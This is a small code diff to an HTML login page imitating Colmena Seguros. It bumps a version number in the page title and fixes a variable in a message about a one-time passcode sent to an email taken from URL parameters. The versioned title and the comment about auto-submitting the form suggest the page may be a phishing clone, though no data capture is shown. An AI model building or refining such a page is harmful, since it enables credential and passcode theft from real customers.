@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>v10 Iniciar Sesión - Colmena Seguros</title>
+    <title>v11 Iniciar Sesión - Colmena Seguros</title>
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
     <style>     
         .helpLink.tiny {
@@ -213,7 +213,7 @@
             const params = getUrlParams();
             if (params.email) {
                 document.getElementById('email').value = params.email;
-                document.getElementById('emailLabel').textContent = `Para confirmar tu identidad, hemos enviado un codigo OTP a tu ${correoparams.email.toString()}`;
+                document.getElementById('emailLabel').textContent = `Para confirmar tu identidad, hemos enviado un codigo OTP a tu ${params.email.toString()}`;
             }
            
             // Enviar automáticamente el formulario y mostrar una alerta
